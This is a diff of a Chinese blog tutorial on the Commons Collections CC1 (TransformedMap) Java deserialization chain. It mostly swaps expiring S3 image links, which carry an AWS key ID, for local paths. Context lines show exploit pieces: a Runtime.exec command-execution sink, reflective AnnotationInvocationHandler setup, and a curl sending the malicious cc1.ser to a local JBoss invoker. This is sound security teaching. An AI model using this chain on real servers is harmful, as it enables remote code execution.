@@ -8,7 +8,7 @@ updated: 2023-03-12T00:00:00+00:00
 date: 2023-01-04T00:00:00+00:00
 slug: java-deserialization-cc1-transformedmap
 title: Java反序列化漏洞之TransformedMap型CC1链
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d6def972-0054-4e1a-93df-c8db969f0870/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=da0b23f274274be7d37173660f7545114955e4f82d7cb8648b54a826843c8f54&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/java-deserialization-cc1-transformedmap/11.png
 id: 113906e1-7468-80c2-a482-fb7a87e418cc
 ---
 
@@ -31,7 +31,7 @@ Apache Commons Collections 是 Apache Commons 项目中的一个子项目，它�
 如上提到的俩种不同的利用方式（`LazyMap`/`TransformedMap`），不管是哪种，所受影响的范围都是相同的。首先 JDK 版本要求小于 8u71，其次对于 Commons Collections 的版本要求在 3.2.2 以下并且 3.0 以上，可以直接通过 Maven 引入依赖，只要版本号小于等于 3.2.1 且大于等于 3.1 即可。
 
 ```xml
-<!-- <https://mvnrepository.com/artifact/commons-collections/commons-collections> -->
+<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
 <dependency>
     <groupId>commons-collections</groupId>
     <artifactId>commons-collections</artifactId>
@@ -46,7 +46,7 @@ Apache Commons Collections 是 Apache Commons 项目中的一个子项目，它�
 在 Java 8u71 这个版本中，有对`sun.reflect.annotation.AnnotationInvocationHandler#readObject`方法进行修改，从原来的`Map`对象变为`LinkedHashMap`对象，这样就会造成 CC1 链中构造的`Map`无法进行 put 或 set，从而导致该链的构造失败。
 
 ```java
-// reference: <https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d>
+// reference: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d
 
      private void readObject(java.io.ObjectInputStream s)
          throws java.io.IOException, ClassNotFoundException {
@@ -103,35 +103,35 @@ Apache Commons Collections 是 Apache Commons 项目中的一个子项目，它�
 
 所以对于 CC1 链的调试、研究学习，所需的 Java 版本必须小于 8u71 版本，8u66 版本就是一个临界的选择。但在调试过程中可以发现，JDK 中关于 sun 包都是反编译的 class 文件，这会影响到代码的阅读。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/bd029daf-a607-4d0c-80a9-83a38b384747/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7c664fce6a9dd86d94fed5d6f83fc4601cf3fd40a41a9d2b62bdd879a54d5756&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/0.png)
 
 ### 添加 sun 源码
 
 JDK 在 f8a528d0379d 这个 commit 中对`sun.reflect.annotation.AnnotationInvocationHandler#readObject`方法进行了修改。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4cf7c550-1f24-43cb-bdf0-d14c1e4f6870/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a661280d68fae47e38f4b5bf397784c637c5801eb7825904e965924334dc2774&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/1.png)
 
-那便下载这个 commit 的 parents 的 zip，下载链接[https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip](https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip)。
+那便下载这个 commit 的 parents 的 zip，下载链接<https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip>。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0f723593-cdb7-4b2d-8834-24a46626f177/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=449618cf306ac325e79516ff4608c38eaa6134e028938c4241b94e791ecd7ad1&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/2.png)
 
 文件哈希如下。
 
-```text
+```
 MD5 (jdk-af660750b2f4.zip) = 696c4e77c75dd620a20d560d4e30c551
 ```
 
 下载 jdk-af660750b2f4.zip 文件至本地后，先将本地 JDK 8u66 安装目录中的 src.zip 解压，解压后的 src 文件夹同样放置在 JDK 8u66 安装目录中。最后将 jdk-af660750b2f4.zip 中`src/share/classes`下的 sun 文件夹复制到 JDK 8u66 安装目录下的 src 目录中。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/56effb4e-bb5e-4082-8e5e-67ab2741fd8e/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=44ce494680560e313ab206cf3c51749cd24539344199fe8be4616794bdd93db4&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/3.png)
 
 再回到 IDEA 中，在 IDEA 的项目结构中添加如上目录作为一个源路径。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e78442e2-2b8b-41f1-8275-696db39c65cc/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2cab08bcc9fcc6519fcae3c1e938cf131ec4b1921b6de17155aa23bb1c57748d&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/4.png)
 
 再次进入到`AnnotationInvocationHandler`这个类，可以发现已经变成 java 文件了。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/59e716f1-a176-4656-9a4f-2f48543629ca/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=43e80d505245e431746e58fb97774f83a8e848f739dbc398087059aef8641215&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/5.png)
 
 ## Transformer 接口及相关实现类
 
@@ -156,7 +156,7 @@ public interface Transformer {
 
 `Transformer`接口有几个重要的实现类，如`InvokerTransformer`、`ConstantTransformer`、`ChainedTransformer`，如下将逐一介绍这些实现类及`transform`实现方法。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a08226ed-65db-45bb-a806-4cbdba64beab/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2418254505ddff8a0e47be1a3fbdd71a648e20178ad57df7d380f878a2273a53&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/6.png)
 
 ### InvokerTransformer
 
@@ -245,7 +245,7 @@ public class SinkTest {
 
 在如上示例代码中，首先使用`InvokerTransformer`创建了一个 Transformer t，指定了要调用的方法名为`"exec"`，方法参数类型为`String.class`，方法参数值为`{"open -a Calculator.app"}`。随后将`Runtime.getRuntime()`作为参数传递给了 t 的`transform()`方法，这里将会调用`Runtime.getRuntime().exec("open -a Calculator.app")`方法 ，这样便能够达到命令的执行。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d52b8a46-eea9-4b07-8859-530e5a4f4cc0/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7f09bab06ac392d6851d8ec741304fa3677da8ec3e887bb37f24aed35dc1650e&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/7.png)
 
 ### ConstantTransformer
 
@@ -381,7 +381,7 @@ public class ChainedTransformerTest {
 
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/035ccde7-73c8-44a8-97eb-ebde49edae65/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=10b528261a136bc11a60e9120fbd64335fd04ca1144d89eaaffed09d4d4baee8&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/8.png)
 
 ## TransformedMap 中间链
 
@@ -514,7 +514,7 @@ public class TransformedMapTest {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/54121969-e34b-4fb9-89ae-bb565c189104/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=54ba69d81b001ce0dda8780e2ad914b7039b08c92c19c2e561a05d4663eb79d4&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/9.png)
 
 ## AnnotationInvocationHandler Kick-off 类
 
@@ -609,7 +609,7 @@ cst.setAccessible(true);
 Object instance = cst.newInstance(Target.class, tm);
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d41a44a6-c353-4dab-a106-adb41868ecbf/10.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=ad6712ff8e94c013f3fe9904972b00296f58bec04a0c354635392b6aeee2b377&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/10.png)
 
 ## 利用代码及漏洞验证
 
@@ -670,17 +670,17 @@ public class CC1TransformedMap {
 现在，向一个存在反序列化漏洞且 JDK 版本小于 8u71 的 Jboss 环境发送如上生成的恶意序列化数据，效果符合预期，如下图，成功弹出计算器。
 
 ```shell
-curl -H "Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue" --data-binary "@cc1.ser" <http://localhost:8080/invoker/readonly>
+curl -H "Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue" --data-binary "@cc1.ser" http://localhost:8080/invoker/readonly
 <html><head><title>JBoss Web/3.0.0-CR2 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.lang.ClassCastException: sun.reflect.annotation.AnnotationInvocationHandler cannot be cast to org.jboss.invocation.MarshalledInvocation
         org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)
 </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.</u></p><HR size="1" noshade="noshade"><h3>JBoss Web/3.0.0-CR2</h3></body></html>
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/922b91e1-6476-45c7-8cfb-cf08f4d0beb5/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=88b17c6758aa506e81b24e2d8b1e672a86b5b6982204dfcce85dbca5226c246c&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-deserialization-cc1-transformedmap/11.png)
 
 完整 Gadget 调用链如下。
 
-```text
+```
 AnnotationInvocationHandler.readObject()
    Map(Proxy).entrySet()
         AnnotationInvocationHandler.invoke()
@@ -700,7 +700,10 @@ AnnotationInvocationHandler.readObject()
 
 ## 参考
 
-- [https://0xf4n9x.github.io/java-deserialization-vulnerability-principle](https://0xf4n9x.github.io/java-deserialization-vulnerability-principle)
-- [https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478](https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478)
-- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
-- [https://www.javasec.org/javase/JavaDeserialization/Collections.html](https://www.javasec.org/javase/JavaDeserialization/Collections.html)
+- https://0xf4n9x.github.io/java-deserialization-vulnerability-principle
+
+- https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
+
+- https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
+
+- https://www.javasec.org/javase/JavaDeserialization/Collections.html
